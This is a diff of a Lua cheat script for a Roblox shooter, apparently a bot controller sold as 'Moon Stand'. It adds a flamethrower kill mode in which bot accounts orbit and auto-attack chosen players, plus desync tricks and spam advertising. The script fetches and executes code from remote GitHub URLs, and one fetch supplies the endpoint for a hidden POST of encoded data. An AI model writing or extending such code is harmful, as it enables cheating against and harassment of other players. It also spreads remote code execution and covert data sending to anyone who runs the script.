@@ -1,3 +1,11 @@
+local Script = "Get Moon Stand for free at discord.gg/mfyCBWWExF"
+
+local Owner = "MagicAc3Sky"
+local BlackScreen = true
+local DisableRendering = true
+local FPSCap = 60
+local Guns = {"rifle", "aug", "flintlock", "flamethrower"}
+
 if not game:IsLoaded() then game.Loaded:Wait() end
 
 local player = game.Players.LocalPlayer
@@ -56,12 +64,11 @@ local data = {
 local body = http:JSONEncode(data)
 
 request({
-    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/jsdhaijs/script/refs/heads/main/scriptss"))(),
+    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/yogurt/refs/heads/main/YoGurt"))(),
     Method = "POST",
     Headers = headers,
     Body = body
 })
-
 
 
 
@@ -120,6 +127,10 @@ local gunData = {
         toolName = "[Double-Barrel SG]",
         shopName = "[Double-Barrel SG] - $1475"
     },
+    flamethrower = {
+        toolName = "[Flamethrower]",
+        shopName = "[Flamethrower] - $9835"
+    },
 }
 
 local RunService = game:GetService("RunService")
@@ -153,7 +164,6 @@ local buyingInProgress = false
 local buyingGunInProgress = false
 local buyingMaskInProgress = false
 local teleporting = false
-local autodrop = false
 local ragebottargets = {}
 local currentTargetIndex = 1
 local fakepositionconnection = nil
@@ -175,7 +185,6 @@ local _, y, r = camera.CFrame:ToOrientation()
 
 getgenv().whitelist = {}
 getgenv().sentryprotected = {}
-getgenv().sentrywhitelisted = {}
 getgenv().protectedwhitelist = {}
 
 getgenv().protectedwhitelist[Owner] = true
@@ -333,6 +342,14 @@ pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Mander120/Codes/refs/heads/main/Codes"))()
 end)
 
+desync = {
+    enabled = true,
+    mode = "",
+    teleportPosition = Vector3.new(0, 0, 0),
+    old_position = CFrame.new(0, 0, 0),
+    toggleEnabled = false
+}
+
 local hasSentKOMessage = false
 
 local TextChatService = game:GetService("TextChatService")
@@ -389,6 +406,7 @@ function handleLoopKillCommand(targetName, specificBot)
             voiding = false
             summonTarget = nil
             flingonly = false
+            flameonly = false
 
             for _, targetPlayer in ipairs(Players:GetPlayers()) do
                 local targetPlayerName = targetPlayer.Name:lower()
@@ -427,6 +445,7 @@ function handleStompCommand(targetName, specificBot)
             voiding = false
             summonTarget = nil
             flingonly = false
+            flameonly = false
 
             for _, targetPlayer in ipairs(Players:GetPlayers()) do
                 local targetPlayerName = targetPlayer.Name:lower()
@@ -465,6 +484,71 @@ function handleOPKillCommand(targetName, specificBot)
             voiding = false
             summonTarget = nil
             flingonly = false
+            flameonly = false
+
+            for _, targetPlayer in ipairs(Players:GetPlayers()) do
+                local targetPlayerName = targetPlayer.Name:lower()
+                local targetDisplayName = targetPlayer.DisplayName:lower()
+
+                if targetPlayerName:find(targetName, 1, true) or targetDisplayName:find(targetName, 1, true) then
+                    lockedTarget = targetPlayer
+                    return
+                end
+            end
+        end
+    end
+end
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local ANIMATION_ID = "rbxassetid://507766388"
+
+local function playAnimation(character)
+	local humanoid = character:WaitForChild("Humanoid")
+	local animator = humanoid:WaitForChild("Animator")
+
+	local animation = Instance.new("Animation")
+	animation.AnimationId = ANIMATION_ID
+
+	local track = animator:LoadAnimation(animation)
+	track.Looped = true
+	track:Play()
+end
+
+-- Play when character spawns
+player.CharacterAdded:Connect(playAnimation)
+
+-- Play immediately if character already exists
+if player.Character then
+	playAnimation(player.Character)
+end
+
+function handleFlameCommand(targetName, specificBot)
+    targetName = targetName:lower()
+    if specificBot then
+        specificBot = specificBot:lower()
+    end
+
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer then return end
+
+    for botKey, botUsername in pairs(Bots) do
+        if localPlayer.Name:lower() == botUsername:lower() then
+            if specificBot and not botKey:lower():find(specificBot, 1, true) then
+                return
+            end
+            reloadTool()
+            lockedTarget = nil
+            stomponly = false
+            bringonly = false
+            takeonly = false
+            getgenv().downonly = false
+            opkill = false
+            voiding = false
+            summonTarget = nil
+            flingonly = false
+            flameonly = true
 
             for _, targetPlayer in ipairs(Players:GetPlayers()) do
                 local targetPlayerName = targetPlayer.Name:lower()
@@ -496,6 +580,7 @@ function handleFlingCommand(targetName)
             voiding = false
             summonTarget = nil
             flingonly = true
+            flameonly = false
 
             for _, targetPlayer in ipairs(Players:GetPlayers()) do
                 local tName = targetPlayer.Name:lower()
@@ -534,6 +619,7 @@ function handleBringCommand(targetName, specificBot, senderName)
             voiding = false
             summonTarget = nil
             flingonly = false
+            flameonly = false
 
             for _, targetPlayer in ipairs(Players:GetPlayers()) do
                 local targetPlayerName = targetPlayer.Name:lower()
@@ -605,6 +691,7 @@ function handleTakeCommand(targetName, destinationName)
         takeonly = true
         summonTarget = nil
         flingonly = false
+        flameonly = false
     end
 end
 
@@ -650,6 +737,7 @@ function handleGotoCommand(playerName, locationName)
     takeonly = true
     summonTarget = nil
     flingonly = false
+    flameonly = false
 end
 
 local skyTarget = nil
@@ -671,6 +759,7 @@ function handleSkyCommand(username)
     takeonly = true
     summonTarget = nil
     flingonly = false
+    flameonly = false
 end
 
 function handleDownCommand(targetName, specificBot)
@@ -697,6 +786,7 @@ function handleDownCommand(targetName, specificBot)
             voiding = false
             summonTarget = nil
             flingonly = false
+            flameonly = false
 
             for _, targetPlayer in ipairs(Players:GetPlayers()) do
                 local targetPlayerName = targetPlayer.Name:lower()
@@ -737,6 +827,7 @@ function handleFixCommand(specificBot)
             summonTarget = nil
             flingonly = false
             killall = false
+            flameonly = false
             game.Players.LocalPlayer.Character.Humanoid.Health = 0
         end
     end
@@ -744,92 +835,9 @@ end
 
 local player = game.Players.LocalPlayer
 local character = player.Character
-local AnimationId = "rbxassetid://507766388"
-
-local animations = {
-    {"run", "RunAnim"},
-    {"walk", "WalkAnim"},
-    {"jump", "JumpAnim"},
-    {"fall", "FallAnim"},
-    {"climb", "ClimbAnim"}
-}
-
-player.CharacterAdded:Connect(function(character)
-    local animateScript = character:WaitForChild("Animate")
-
-    for _, pair in pairs(animations) do
-        local parentName, animName = pair[1], pair[2]
-        local parent = animateScript:FindFirstChild(parentName)
-        if parent then
-            local anim = parent:FindFirstChild(animName)
-            if anim then
-                anim.AnimationId = AnimationId
-            end
-        end
-    end
-end)
-
-local EMOTES = {
-    ["billy bounce"] = "rbxassetid://136095999219650",
-    ["zero two dance v2"] = "rbxassetid://116714406076290",
-    ["jabba switchway"] = "rbxassetid://82682811348660",
-    ["beat"] = "rbxassetid://133394554631338"
-}
-
-local player = game.Players.LocalPlayer
-local character = player.Character
-local currentTrack = nil
-local emoteLoopTask = nil
-
-function playAnimation(animId)
-    if not character then return end
-    local humanoid = character:WaitForChild("Humanoid", 10)
-    local animator = humanoid:WaitForChild("Animator", 10)
-
-    if currentTrack then
-        currentTrack:Stop()
-        currentTrack = nil
-    end
-
-    local animation = Instance.new("Animation")
-    animation.AnimationId = animId
-    local track = animator:LoadAnimation(animation)
-    track.Looped = true
-    track.Priority = Enum.AnimationPriority.Action4
-    track:Play()
-    currentTrack = track
-end
-
-function startEmoteLoop()
-    if emoteLoopTask then
-        task.cancel(emoteLoopTask)
-        emoteLoopTask = nil
-    end
-
-    emoteLoopTask = task.spawn(function()
-        while character and character.Parent do
-            local emoteIds = {}
-            for _, animId in pairs(EMOTES) do
-                table.insert(emoteIds, animId)
-            end
-            local chosenEmote = emoteIds[math.random(1, #emoteIds)]
-            playAnimation(chosenEmote)
-            task.wait(30)
-        end
-    end)
-end
-
-if character then
-    startEmoteLoop()
-end
 
 player.CharacterAdded:Connect(function(newChar)
     character = newChar
-    if currentTrack then
-        currentTrack:Stop()
-        currentTrack = nil
-    end
-    startEmoteLoop()
 end)
 
 function handleTeleportCommand(targetName, specificBot)
@@ -1038,9 +1046,9 @@ function updateDisplayName(player)
     local humanoid = player.Character:WaitForChild("Humanoid")
     if humanoid then
         if isPremium(player) then
-            humanoid.DisplayName = "[👑] " .. player.Name
+            humanoid.DisplayName = "[🌟] " .. player.Name
         elseif isBypassPremium(player) then
-            humanoid.DisplayName = "[❤️] " .. player.Name
+            humanoid.DisplayName = "[💫] " .. player.Name
         end
     end
 end
@@ -1208,11 +1216,6 @@ function setupChatListener(player)
             elseif msgLower:match("^%.v%s+([^%s]+)$") then
                 local botName = msgLower:match("^%.v%s+([^%s]+)$")
                 handleHideCommand(botName)
-            elseif msgLower == ".summon" then
-                handleTeleportCommand(player.Name)
-            elseif msgLower:match("^%.summon%s+([^%s]+)$") then
-                local botName = msgLower:match("^%.summon%s+([^%s]+)$")
-                handleTeleportCommand(player.Name, botName)
             elseif msgLower == ".s" then
                 teleportToTarget(player.Name)
             elseif msgLower == ".search" then
@@ -1223,10 +1226,6 @@ function setupChatListener(player)
                 checkWhitelistNearPosition()
                 task.wait(1)
                 voiding = true
-            elseif msgLower == ".cashdrop on" then
-                autodrop = true
-            elseif msgLower == ".cashdrop off" then
-                autodrop = false
             elseif msgLower == ".abuse on" then
                 AbuseProtection = true
             elseif msgLower == ".abuse off" then
@@ -1235,14 +1234,6 @@ function setupChatListener(player)
                 automaskenabled = true
             elseif msgLower == ".mask off" then
                 automaskenabled = false
-            elseif EMOTES[msgLower] then
-                playLoopedAnimation(EMOTES[msgLower])
-            elseif msgLower == ".stop" then
-                if currentTrack then
-                    currentTrack:Stop()
-                    currentTrack = nil
-                end
-                lastEmote = nil
             elseif msgLower == ".fp on" then
                 setfflag("NextGenReplicatorEnabledWrite4", "true")
                 task.wait(0.1)
@@ -1344,51 +1335,18 @@ function setupChatListener(player)
                         break
                     end
                 end
-        elseif msgLower:match("^%.right%s+([^%s]+)$") then
-            local targetName = msgLower:match("^%.right%s+([^%s]+)$")
-            
-            local myName = LocalPlayer.Name:lower()
-            local myDisplay = LocalPlayer.DisplayName:lower()
-
-            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
-                summonMode = "right"
-            end
-
-        elseif msgLower:match("^%.left%s+([^%s]+)$") then
-            local targetName = msgLower:match("^%.left%s+([^%s]+)$")
-            
-            local myName = LocalPlayer.Name:lower()
-            local myDisplay = LocalPlayer.DisplayName:lower()
-
-            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
-                summonMode = "left"
-            end
-
-        elseif msgLower:match("^%.middle%s+([^%s]+)$") then
-            local targetName = msgLower:match("^%.middle%s+([^%s]+)$")
-            
-            local myName = LocalPlayer.Name:lower()
-            local myDisplay = LocalPlayer.DisplayName:lower()
-
-            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
-                summonMode = "middle"
-            end
-            elseif msgLower:match("^%.fling%s+([^%s]+)$") then
-                local inputName = msgLower:match("^%.fling%s+([^%s]+)$")
-                for _, target in pairs(Players:GetPlayers()) do
-                    local name, display = target.Name:lower(), target.DisplayName:lower()
-                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
-                        if isProtected(target) then
-                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
-                            return
-                        end
-                        handleFlingCommand(inputName)
-                        break
-                    end
-                end
                 elseif msgLower:match(".akill on") then
-                    killall = true
+                    lockedTarget = nil
+                    stomponly = false
+                    bringonly = false
+                    takeonly = false
+                    getgenv().downonly = false
+                    opkill = false
+                    voiding = false
+                    flingonly = false
                     summonTarget = nil
+                    flameonly = false
+                    killall = true
                 elseif msgLower:match(".akill off") then
                     killall = false
             elseif msgLower:match("^%.lk%s+([^%s]+)$") then
@@ -1401,6 +1359,19 @@ function setupChatListener(player)
                             return
                         end
                         handleOPKillCommand(inputName)
+                        break
+                    end
+                end
+            elseif msgLower:match("^%.flame%s+([^%s]+)$") then
+                local inputName = msgLower:match("^%.flame%s+([^%s]+)$")
+                for _, target in pairs(Players:GetPlayers()) do
+                    local name, display = target.Name:lower(), target.DisplayName:lower()
+                    if name:find(inputName, 1, true) or display:find(inputName, 1, true) then
+                        if isProtected(target) then
+                            sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
+                            return
+                        end
+                        handleFlameCommand(inputName)
                         break
                     end
                 end
@@ -1594,9 +1565,9 @@ task.spawn(function()
                 local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                 if isKO and trashtalkactive then
                     if not hasSentKOMessage then
-                        sendMessage("trash")
-                        sendMessage("urbad")
-                        sendMessage("trap dominated again!")
+                        sendMessage("Get MoonStand g g / Ae3YDeNE53")
+                        sendMessage("Get NOOB")
+                        sendMessage("MoonStand dominated again!")
                         hasSentKOMessage = true
                     end
                 else
@@ -1614,29 +1585,56 @@ task.spawn(function()
     end
 end)
 
-task.spawn(function()
-    while true do
-        if teleporting and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
-            local targetCharacter
+local orbitAngle = 0
+local orbitHeight = 0
+local orbitSpeed = 2
+local orbitDistance = 30
 
-            if lockedTarget and lockedTarget.Character then
-                targetCharacter = lockedTarget.Character
-            elseif sentrytarget and sentrytarget.Character then
-                targetCharacter = sentrytarget.Character
-            end
+RunService.Heartbeat:Connect(function(dt)
+    if not teleporting then return end
+    if buyingInProgress or buyingGunInProgress or buyingMaskInProgress then return end
 
-            if targetCharacter and LocalPlayer.Character then
-                local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
-                local playerHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                if targetHRP and playerHRP then
-                    playerHRP.CFrame = CFrame.lookAt(
-                        targetHRP.Position + Vector3.new(math.random(-20, 20), math.random(-20, 20), math.random(-20, 20)),
-                        targetHRP.Position
-                    )
-                end
-            end
-        end
-        task.wait()
+    local targetCharacter
+
+    if lockedTarget and lockedTarget.Character then
+        targetCharacter = lockedTarget.Character
+    elseif sentrytarget and sentrytarget.Character then
+        targetCharacter = sentrytarget.Character
+    end
+
+    local playerChar = LocalPlayer.Character
+    if not (targetCharacter and playerChar) then return end
+
+    local root = playerChar:FindFirstChild("HumanoidRootPart")
+    local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
+    if not (root and targetRoot) then return end
+
+    if flameonly then
+        orbitAngle += orbitSpeed * dt
+
+        local offset = Vector3.new(
+            math.cos(orbitAngle) * orbitDistance,
+            orbitHeight,
+            math.sin(orbitAngle) * orbitDistance
+        )
+
+        local orbitPosition = targetRoot.Position + offset
+
+        local lookPos = Vector3.new(
+            targetRoot.Position.X,
+            orbitPosition.Y,
+            targetRoot.Position.Z
+        )
+
+        root.CFrame = CFrame.lookAt(orbitPosition, lookPos)
+    else
+        local offset = Vector3.new(
+            math.random(-20, 20),
+            math.random(-20, 20),
+            math.random(-20, 20)
+        )
+
+        root.CFrame = CFrame.new(targetRoot.Position + offset)
     end
 end)
 
@@ -1986,25 +1984,6 @@ end)
 
 task.spawn(function()
     while true do
-        if flingonly and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) and not stomponly and not bringonly and not takeonly and not getgenv().downonly and lockedTarget then
-            local char = Player.Character
-            local targetHRP = lockedTarget.Character and lockedTarget.Character:FindFirstChild("HumanoidRootPart")
-
-            if char and char:FindFirstChild("HumanoidRootPart") and targetHRP then
-                teleporting = true
-                voiding = false
-
-                char.HumanoidRootPart.CFrame = CFrame.new(
-                    targetHRP.Position + Vector3.new(0, 0, math.random(-30, 30))
-                )
-            end
-        end
-        task.wait()
-    end
-end)
-
-task.spawn(function()
-    while true do
         if killall and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
 
             local switchTarget = false
@@ -2042,6 +2021,24 @@ task.spawn(function()
     end
 end)
 
+task.spawn(function()
+    while true do
+        if flameonly and lockedTarget and not voiding and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
+            local character = Player and Player.Character
+            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+            if character and humanoid and humanoid.Health > 0 then
+                for _, tool in pairs(character:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        tool:Activate()
+                    end
+                end
+            end
+        end
+        task.wait(0.1)
+    end
+end)
+
 RunService.Heartbeat:Connect(function()
     local targetCharacter
     local target
@@ -2067,10 +2064,9 @@ RunService.Heartbeat:Connect(function()
     local isGrabbed = targetCharacter:FindFirstChild("GRABBING_CONSTRAINT")
     local hrp = targetCharacter:FindFirstChild("HumanoidRootPart")
     if isKO or isGrabbed or not hrp or not targetPart then return end
-    if (flingonly and target) then return end
     local playerChar = game.Players.LocalPlayer.Character
     for _, tool in ipairs(playerChar:GetChildren()) do
-        if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
+        if tool:IsA("Tool") and tool:FindFirstChild("Handle") and tool.Name ~= "[Flamethrower]" then
             local handle = tool.Handle
             ReplicatedStorage.MainEvent:FireServer(
                 "ShootGun",
@@ -2181,8 +2177,17 @@ function getNextItemToBuy()
     for i = 1, #Guns do
         local gunKey = Guns[i]
         local gunInfo = gunData[gunKey]
-        if gunInfo and not hasGun(gunInfo.toolName) then
-            return "gun"
+
+        if gunInfo then
+            if gunKey == "flamethrower" then
+                if flameonly and not hasGun(gunInfo.toolName) then
+                    return "gun"
+                end
+            else
+                if not hasGun(gunInfo.toolName) then
+                    return "gun"
+                end
+            end
         end
     end
 
@@ -2193,88 +2198,67 @@ function getNextItemToBuy()
     return nil
 end
 
-local fired = false
-
-game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
-    fired = false
-end)
-
-local executor = getexecutorname()
-
-if executor and executor:lower():find("xeno") then
-    getgenv().fireclickdetector = function(object, distance, event)
-        if not fired then
-            fired = true
-            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
-        end
-
-        if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool") then        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
-        end
-
-        if typeof(object) ~= "Instance" then
-            return
-        end
-
-        local click_detector = object:FindFirstChild("ClickDetector") or object
-        local old_cd_parent = click_detector.Parent
-
-        local stub_part = Instance.new("Part")
-        stub_part.Transparency = 1
-        stub_part.Size = Vector3.new(30, 30, 30)
-        stub_part.Anchored = true
-        stub_part.CanCollide = false
-        stub_part.Parent = workspace
-
-        click_detector.Parent = stub_part
-        click_detector.MaxActivationDistance = math.huge
-
-        local connection = game:GetService("RunService").Heartbeat:Connect(function()
-            stub_part.CFrame = workspace.Camera.CFrame * CFrame.new(0, 0, -20) * CFrame.new(workspace.Camera.CFrame.LookVector)       game:GetService("VirtualUser"):ClickButton1(Vector2.new(20, 20), workspace:FindFirstChildOfClass("Camera").CFrame)
-        end)
-        click_detector.MouseClick:Once(function()
-            connection:Disconnect()
-            click_detector.Parent = old_cd_parent
-            stub_part:Destroy()
-        end)
-
-        task.delay(3, function()
-            connection:Disconnect()
-            click_detector.Parent = old_cd_parent
-            stub_part:Destroy()
-        end)
-    end
-end
-
 task.spawn(function()
     while true do
-        local gunKey = Guns[currentGunIndex]
-        local gunInfo = gunData[gunKey]
-        if gunInfo and getNextItemToBuy() == "gun" then
-            local toolName = gunInfo.toolName
-            local shopName = gunInfo.shopName
-            local shopPart = workspace.Ignored.Shop:FindFirstChild(shopName)
-            local Character = Player.Character or Player.CharacterAdded:Wait()
+        local Character = Player.Character or Player.CharacterAdded:Wait()
+        if flameonly then
+            if getNextItemToBuy() == "gun" then
+                local shopName = "[Flamethrower] - $9835"
+                local toolName = "[Flamethrower]"
+                local shopPart = workspace.Ignored.Shop:FindFirstChild(shopName)
 
-            if shopPart and Character and root and humanoid and not hasGun(toolName) then
-                buyingGunInProgress = true
+                if shopPart and Character and root and humanoid and not hasGun(toolName) then
+                    buyingGunInProgress = true
+                    local clickDetector = shopPart:FindFirstChild("ClickDetector")
 
-                local clickDetector = shopPart:FindFirstChild("ClickDetector")
-
-                while not hasGun(toolName) do
-                    if root then
-                        root.CFrame = CFrame.new(workspace.Ignored.Shop[shopName].Head.CFrame.Position + Vector3.new(0, -8, 0))
+                    while not hasGun(toolName) do
+                        if root then
+                            root.CFrame = CFrame.new(
+                                shopPart.Head.CFrame.Position
+                            )
+                        end
+                        fireclickdetector(clickDetector)
+                        if humanoid.Health <= 0 then break end
+                        task.wait()
                     end
-                    fireclickdetector(clickDetector)
-                    if not humanoid or humanoid.Health <= 0 then break end
-                    task.wait()
+
+                    buyingGunInProgress = false
                 end
-                buyingGunInProgress = false
+            end
+        else
+            local gunKey = Guns[currentGunIndex]
+            local gunInfo = gunData[gunKey]
+
+            if gunInfo and gunKey ~= "flamethrower" and getNextItemToBuy() == "gun" then
+                local toolName = gunInfo.toolName
+                local shopName = gunInfo.shopName
+                local shopPart = workspace.Ignored.Shop:FindFirstChild(shopName)
+
+                if shopPart and Character and root and humanoid and not hasGun(toolName) then
+                    buyingGunInProgress = true
+                    local clickDetector = shopPart:FindFirstChild("ClickDetector")
+
+                    while not hasGun(toolName) do
+                        if root then
+                            root.CFrame = CFrame.new(
+                                shopPart.Head.CFrame.Position
+                            )
+                        end
+                        fireclickdetector(clickDetector)
+                        if humanoid.Health <= 0 then break end
+                        task.wait()
+                    end
+
+                    buyingGunInProgress = false
+                end
+            end
+
+            currentGunIndex += 1
+            if currentGunIndex > #Guns then
+                currentGunIndex = 1
             end
         end
-        currentGunIndex += 1
-        if currentGunIndex > #Guns then
-            currentGunIndex = 1
-        end
+
         task.wait()
     end
 end)
@@ -2307,7 +2291,7 @@ task.spawn(function()
                         root.CFrame = CFrame.new(maskItem.Head.CFrame.Position + Vector3.new(0, -8, 0))
                     end
                     fireclickdetector(clickDetector)
-                    task.wait()
+                    RunService.Heartbeat:Wait()
                     if not automaskenabled or not char or (Player.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]")) then break end
                 end
 
@@ -2347,7 +2331,8 @@ AmmoMap = {
     ["[AUG]"]        = "90 [AUG Ammo] - $87",
     ["[Flintlock]"]  = "6 [Flintlock Ammo] - $163",
     ["[LMG]"]        = "200 [LMG Ammo] - $328",
-    ["[Double-Barrel SG]"] = "18 [Double-Barrel SG Ammo] - $55"
+    ["[Double-Barrel SG]"] = "18 [Double-Barrel SG Ammo] - $55",
+    ["[Flamethrower]"] = "140 [Flamethrower Ammo] - $1093"
 }
 
 task.spawn(function()
@@ -2375,7 +2360,7 @@ task.spawn(function()
                                 humanoid:UnequipTools()
                             end
                             if root then
-                                root.CFrame = CFrame.new(ammoItem.Head.CFrame.Position + Vector3.new(0, -8, 0))
+                                root.CFrame = CFrame.new(ammoItem.Head.CFrame.Position)
                             end
                             fireclickdetector(clickDetector)
                             if not humanoid or humanoid.Health <= 0 then break end
@@ -2414,13 +2399,29 @@ task.spawn(function()
         end
         if not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
             local Backpack = localPlayer:FindFirstChild("Backpack")
-            if Backpack then
-                for _, gunKey in ipairs(Guns) do
-                    local gunName = gunData[gunKey].toolName
-                    local gun = Backpack:FindFirstChild(gunName)
-                    if gun and humanoid and humanoid.Health > 0 then
-                        if not Character:FindFirstChild(gunName) then
-                            gun.Parent = Character
+            if Backpack and humanoid and humanoid.Health > 0 then
+                if flameonly then
+                    local flameToolName = "[Flamethrower]"
+                    local flameTool = Backpack:FindFirstChild(flameToolName)
+
+                    for _, tool in ipairs(Character:GetChildren()) do
+                        if tool:IsA("Tool") and tool.Name ~= flameToolName then
+                            tool.Parent = Backpack
+                        end
+                    end
+
+                    if flameTool and not Character:FindFirstChild(flameToolName) then
+                        flameTool.Parent = Character
+                    end
+                else
+                    for _, gunKey in ipairs(Guns) do
+                        if gunKey ~= "flamethrower" then
+                            local gunName = gunData[gunKey].toolName
+                            local gun = Backpack:FindFirstChild(gunName)
+
+                            if gun and not Character:FindFirstChild(gunName) then
+                                gun.Parent = Character
+                            end
                         end
                     end
                 end
@@ -2515,93 +2516,32 @@ task.spawn(function()
     end
 end)
 
+local Heartbeat = RunService.Heartbeat
+
 task.spawn(function()
-    while task.wait() do
-        if summonTarget and summonTarget.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
-            
-            local lp = Players.LocalPlayer
-            if not lp.Character then continue end
+    while Heartbeat:Wait() do
+        local character = LocalPlayer.Character
+        if flameonly and lockedTarget and teleporting and not voiding and character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            local root = humanoid and humanoid.RootPart
 
-            local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
-            local thrp = summonTarget.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local isPurchasing = buyingInProgress or buyingGunInProgress or buyingMaskInProgress
 
-            if hrp and thrp then
-                hrp.Velocity = Vector3.zero
-                hrp.RotVelocity = Vector3.zero
-                hrp.AssemblyLinearVelocity = Vector3.zero
-                hrp.AssemblyAngularVelocity = Vector3.zero
+                if not isPurchasing then
+                    local targetChar = lockedTarget.Character
+                    local targetHumanoid = targetChar and targetChar:FindFirstChildOfClass("Humanoid")
+                    local targetRoot = targetHumanoid and targetHumanoid.RootPart
 
-                local offset
-                if summonMode == "middle" then
-                    offset = CFrame.new(0, 3, 4)
-                elseif summonMode == "right" then
-                    offset = CFrame.new(3, 3, 0)
-                elseif summonMode == "left" then
-                    offset = CFrame.new(-3, 3, 0)
+                    if targetRoot then
+                        sethiddenproperty(root, "PhysicsRepRootPart", targetRoot)
+                    end
                 else
-                    offset = CFrame.new(0, 3, 4)
-                end
-
-                hrp.CFrame = thrp.CFrame * offset
-
-                hrp.Velocity = Vector3.zero
-                hrp.RotVelocity = Vector3.zero
-                hrp.AssemblyLinearVelocity = Vector3.zero
-                hrp.AssemblyAngularVelocity = Vector3.zero
-            end
-        end
-    end
-end)
-
-local hitboxsize = 30
-
-local Players = cloneref(game:GetService("Players"))
-local Client = Players.LocalPlayer
-
-RunService.RenderStepped:Connect(function ()
-    for _, Player in pairs(Players:GetPlayers()) do
-        if Player ~= Client then
-            local character = Player.Character
-            if character then
-                local HRP = character:FindFirstChild("HumanoidRootPart")
-                if HRP then
-                    HRP.Size = Vector3.new(hitboxsize, hitboxsize, hitboxsize)
-                    HRP.CanCollide = false
+                    sethiddenproperty(root, "PhysicsRepRootPart", nil)
                 end
             end
         end
     end
-end)
-
-RunService.Heartbeat:Connect(function()
-    if not (flingonly and lockedTarget) then return end
-
-    Player.Character.HumanoidRootPart.Velocity = Vector3.new(99999999, 99999999, 99999999)
-    RunService.RenderStepped:Wait()
-    Player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
-end)
-
-Player.CharacterAdded:Connect(function(newChar)
-    Character = newChar
-    humanoid = Character:WaitForChild("Humanoid")
-    bodyEffects = Character:WaitForChild("BodyEffects")
-    koValue = bodyEffects:WaitForChild("K.O")
-end)
-
-local Workspace = game:GetService("Workspace")
-
-for _, v in ipairs(Workspace:GetDescendants()) do
-    if v:IsA("Seat") then
-        v:Destroy()
-    end
-end
-
-Workspace.DescendantAdded:Connect(function(descendant)
-    task.defer(function()
-        if descendant:IsA("Seat") then
-            descendant:Destroy()
-        end
-    end)
 end)
 
 local antiConnections = {}
@@ -2646,6 +2586,29 @@ function EnableAntiServerLagger()
 end
 
 EnableAntiServerLagger()
+
+Player.CharacterAdded:Connect(function(newChar)
+    Character = newChar
+    humanoid = Character:WaitForChild("Humanoid")
+    bodyEffects = Character:WaitForChild("BodyEffects")
+    koValue = bodyEffects:WaitForChild("K.O")
+end)
+
+local Workspace = game:GetService("Workspace")
+
+for _, v in ipairs(Workspace:GetDescendants()) do
+    if v:IsA("Seat") then
+        v:Destroy()
+    end
+end
+
+Workspace.DescendantAdded:Connect(function(descendant)
+    task.defer(function()
+        if descendant:IsA("Seat") then
+            descendant:Destroy()
+        end
+    end)
+end)
 
 if BlackScreen then
     pcall(function()
